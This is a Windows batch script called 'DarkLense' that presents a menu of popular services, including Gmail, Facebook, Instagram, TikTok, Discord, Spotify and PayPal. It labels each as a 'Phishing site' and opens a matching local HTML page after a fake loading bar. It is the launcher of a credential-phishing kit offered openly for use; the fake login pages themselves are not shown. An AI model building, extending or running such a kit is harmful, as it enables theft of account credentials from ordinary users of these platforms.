@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion
title DarkLense - by Myneyy




:menu
:banner
for /f %%A in ('"prompt $H & echo on & for %%B in (1) do rem"') do set "BS=%%A"
color 9
echo.
echo.
echo                                  ███╗   ███╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
echo                                  ████╗ ████║██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
echo                                  ██╔████╔██║██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
echo                                  ██║╚██╔╝██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
echo                                  ██║ ╚═╝ ██║██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
echo.                                 ╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ v1. by Myneyy                          
                              

echo                                ╔══════^> Gmail                                       ╔══════^> TikTok
echo                                ║                                                    ║ 
echo                                ╠══════^> Facebook                                    ╠══════^> Discord
echo                                ║                                                    ║
echo                                ╠══════^> Instagram                                   ╠══════^> Spotify
echo                                ║                                                    ║ 
echo                                ╠══════^> Twitter                                     ╠══════^> Paypal
echo                                ║                                                    ║
echo                                ╠══════^> Iserv                                       ╚══════^> Myneyy
echo                                ║
echo                                ║                                                                                     
echo                                ║

set /p choice=%BS%                               ╚══════^> Chose: 







cls
if %choice%==Gmail goto gmail
if %choice%==Facebook goto facebook
if %choice%==Instagram goto instagram
if %choice%==Twitter goto twitter
if %choice%==Iserv goto iserv
if %choice%==TikTok goto tiktok
if %choice%==Spotify goto spotify
if %choice%==Discord goto discord
if %choice%==Paypal goto paypal
if %choice%==Myneyy goto myneyy
goto menu



:gmail
cls
set "progress="
for /L %%i in (1,1,20) do (
    set progress=!progress!█
    set /a percent=%%i*5
    cls
    echo Loading your Gmail Phishing site: !progress! !percent!%%
    timeout /nobreak /t 1 >nul
)
start google.html
exit


:facebook
cls
set "progress="
for /L %%i in (1,1,20) do (
    set progress=!progress!█
    set /a percent=%%i*5
    cls
    echo Loading your Facebook Phishing site: !progress! !percent!%%
    timeout /nobreak /t 1 >nul
)
start facebook.html
exit


:instagram
cls
set "progress="
for /L %%i in (1,1,20) do (
    set progress=!progress!█
    set /a percent=%%i*5
    cls
    echo Loading your Instagram Phishing site: !progress! !percent!%%
    timeout /nobreak /t 1 >nul
)
start instagram.html
exit


:twitter
cls
set "progress="
for /L %%i in (1,1,20) do (
    set progress=!progress!█
    set /a percent=%%i*5
    cls
    echo Loading your Twitter Phishing site: !progress! !percent!%%
    timeout /nobreak /t 1 >nul
)
start twitter.html
exit


:iserv
cls
set "progress="
for /L %%i in (1,1,20) do (
    set progress=!progress!█
    set /a percent=%%i*5
    cls
    echo Loading your Iserv Phishing site: !progress! !percent!%%
    timeout /nobreak /t 1 >nul
)
start iserv.html
exit

:tiktok
cls
set "progress="
for /L %%i in (1,1,20) do (
    set progress=!progress!█
    set /a percent=%%i*5
    cls
    echo Loading your TikTok Phishing site: !progress! !percent!%%
    timeout /nobreak /t 1 >nul
)
start tiktok.html
exit

:discord
cls
set "progress="
for /L %%i in (1,1,10) do (
    set progress=!progress!█
    set /a percent=%%i*10
    cls
    echo Loading your Discord Phishing site: !progress! !percent!%%
    timeout /nobreak /t 1 >nul
)
start discord.html
exit

:spotify
cls
set "progress="
for /L %%i in (1,1,20) do (
    set progress=!progress!█
    set /a percent=%%i*5
    cls
    echo Loading your Spotify Phishing site: !progress! !percent!%%
    timeout /nobreak /t 1 >nul
)
start spotify.html
exit

:paypal
cls
set "progress="
for /L %%i in (1,1,20) do (
    set progress=!progress!█
    set /a percent=%%i*5
    cls
    echo Loading your Paypal Phishing site: !progress! !percent!%%
    timeout /nobreak /t 1 >nul
)
start paypal.html
exit


:myneyy
cls
start https://guns.lol/myneyy
goto menu